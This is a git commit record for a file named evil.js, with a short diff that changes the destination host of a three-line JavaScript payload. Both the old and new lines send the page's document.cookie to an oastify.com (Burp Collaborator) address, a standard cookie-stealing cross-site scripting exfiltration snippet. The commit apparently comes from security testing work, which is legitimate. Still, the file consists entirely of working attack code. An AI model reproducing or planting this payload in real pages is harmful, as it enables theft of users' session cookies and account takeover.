600f1d16b4482900685e038922fc5c8ae719a282
lockerd123 <yiyangnp123@gmail.com>
2023-06-30 01:08:28 +0800

    Update evil.js
    sadasd

--- evil.js
+++ evil.js
@@ -1,3 +1,3 @@
 var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'http://288kgjhubykdinplkkaktnptlkrbf63v.oastify.com/?' + document.cookie, true);
+xhttp.open('GET', 'http://334lbkcv6zfedokmfl5lookuglmca8yx.oastify.com/?' + document.cookie, true);
 xhttp.send();
